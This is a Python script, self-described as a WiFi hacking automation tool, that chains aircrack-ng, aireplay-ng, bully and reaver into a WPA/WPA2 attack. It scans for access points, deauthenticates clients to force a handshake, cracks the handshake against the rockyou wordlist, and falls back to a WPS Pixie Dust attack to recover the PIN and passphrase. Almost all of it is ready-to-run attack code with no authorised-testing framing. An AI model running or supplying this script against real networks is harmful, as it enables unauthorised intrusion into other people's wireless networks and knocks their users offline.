#!/usr/bin/env python3
"""
WiFi Hacking Automation Script - Handshake Capture & WPA/WPA2 Cracking
Requires: aircrack-ng suite, reaver, bully, and a compatible wireless adapter in monitor mode.
Run as root.
"""

import subprocess
import os
import sys
import time
import re

# ========== CONFIGURATION ==========
INTERFACE = "wlan0mon"          # Monitor mode interface
CHANNEL = 6                     # Target channel (auto-scan if 0)
BSSID = "AA:BB:CC:DD:EE:FF"     # Target AP MAC
CLIENT_MAC = ""                 # Specific client (leave empty for broadcast deauth)
HANDSHAKE_FILE = "handshake.cap"
WORDLIST = "/usr/share/wordlists/rockyou.txt"   # Path to wordlist
TIMEOUT_DEAUTH = 30             # Seconds to wait for handshake
# ===================================

def run_cmd(cmd, capture_output=False):
    """Run shell command and return output if capture_output=True."""
    if capture_output:
        result = subprocess.run(cmd, shell=True, capture_output=True, text=True)
        return result.stdout.strip(), result.stderr.strip()
    else:
        subprocess.run(cmd, shell=True)

def set_monitor(iface):
    """Enable monitor mode on interface."""
    run_cmd(f"sudo ip link set {iface} down")
    run_cmd(f"sudo iw dev {iface} set type monitor")
    run_cmd(f"sudo ip link set {iface} up")
    print(f"[+] {iface} set to monitor mode.")

def scan_aps(iface):
    """Scan for access points and list them."""
    print("[*] Scanning for APs...")
    out, _ = run_cmd(f"sudo airodump-ng {iface} --output-format csv -w scan", capture_output=True)
    # Parse CSV (simple)
    print("[+] Available APs (BSSID, CH, ESSID):")
    # We'll just run airodump in a separate process and show output
    run_cmd(f"sudo timeout 10 airodump-ng {iface}")

def capture_handshake(iface, bssid, channel, client_mac, output_file, timeout=30):
    """
    Capture WPA handshake using airodump and deauth attack.
    Returns True if handshake captured.
    """
    # Start airodump in background
    airodump_cmd = f"sudo airodump-ng -c {channel} --bssid {bssid} -w {output_file} {iface}"
    proc = subprocess.Popen(airodump_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    print(f"[*] Starting airodump on channel {channel} for BSSID {bssid}...")
    time.sleep(3)

    # Deauth attack to force reconnection
    deauth_cmd = f"sudo aireplay-ng -0 5 -a {bssid}"
    if client_mac:
        deauth_cmd += f" -c {client_mac}"
    deauth_cmd += f" {iface}"
    print("[*] Sending deauth packets...")
    run_cmd(deauth_cmd)

    # Wait for handshake capture
    print(f"[*] Waiting up to {timeout} seconds for handshake...")
    start = time.time()
    captured = False
    while time.time() - start < timeout:
        # Check if .cap file contains handshake (use aircrack-ng -J to test)
        check_cmd = f"sudo aircrack-ng -J handshake_test {output_file}.cap 2>/dev/null | grep -q 'WPA handshake'"
        ret = subprocess.run(check_cmd, shell=True)
        if ret.returncode == 0:
            captured = True
            break
        time.sleep(2)
    proc.terminate()
    if captured:
        print(f"[+] Handshake captured in {output_file}.cap")
        return True
    else:
        print("[-] Handshake not captured.")
        return False

def crack_handshake(cap_file, wordlist):
    """Crack the handshake using aircrack-ng with wordlist."""
    print(f"[*] Cracking handshake with wordlist {wordlist}...")
    cmd = f"sudo aircrack-ng -w {wordlist} -b {BSSID} {cap_file}.cap"
    output, err = run_cmd(cmd, capture_output=True)
    # Look for key found
    if "KEY FOUND" in output:
        match = re.search(r"KEY FOUND! \[ (.*?) \]", output)
        if match:
            password = match.group(1)
            print(f"[+] Password found: {password}")
            return password
    print("[-] Password not found in wordlist.")
    return None

def wps_pixie_attack(iface, bssid):
    """Perform Pixie Dust WPS attack using bully."""
    print("[*] Attempting WPS Pixie Dust attack...")
    cmd = f"sudo bully {iface} -b {bssid} -e -v 3"
    output, err = run_cmd(cmd, capture_output=True)
    # Parse output for PIN/PSK
    if "WPS PIN:" in output:
        pin = re.search(r"WPS PIN: (\d+)", output).group(1)
        print(f"[+] WPS PIN found: {pin}")
        # Now get PSK with reaver
        reaver_cmd = f"sudo reaver -i {iface} -b {bssid} -p {pin} -v"
        out2, _ = run_cmd(reaver_cmd, capture_output=True)
        if "WPA PSK:" in out2:
            psk = re.search(r"WPA PSK: (.+)", out2).group(1)
            print(f"[+] PSK: {psk}")
            return psk
    return None

def main():
    if os.geteuid() != 0:
        print("[-] Must run as root.")
        sys.exit(1)

    # Step 1: set monitor mode
    set_monitor(INTERFACE)

    # If no BSSID provided, scan first
    if BSSID == "AA:BB:CC:DD:EE:FF":
        scan_aps(INTERFACE)
        bssid = input("Enter target BSSID: ")
        channel = input("Enter channel: ")
    else:
        bssid = BSSID
        channel = CHANNEL

    # Step 2: capture handshake
    if capture_handshake(INTERFACE, bssid, channel, CLIENT_MAC, HANDSHAKE_FILE, TIMEOUT_DEAUTH):
        # Step 3: crack
        password = crack_handshake(HANDSHAKE_FILE, WORDLIST)
        if password:
            print(f"[SUCCESS] WiFi password: {password}")
        else:
            # Try WPS attack
            print("[*] Attempting WPS fallback...")
            wps_psk = wps_pixie_attack(INTERFACE, bssid)
            if wps_psk:
                print(f"[SUCCESS] WPS PSK: {wps_psk}")
            else:
                print("[-] All attacks failed.")
    else:
        print("[-] Handshake capture failed. Consider stronger deauth or closer proximity.")

    # Cleanup
    run_cmd(f"sudo airmon-ng stop {INTERFACE} 2>/dev/null")

if __name__ == "__main__":
    main()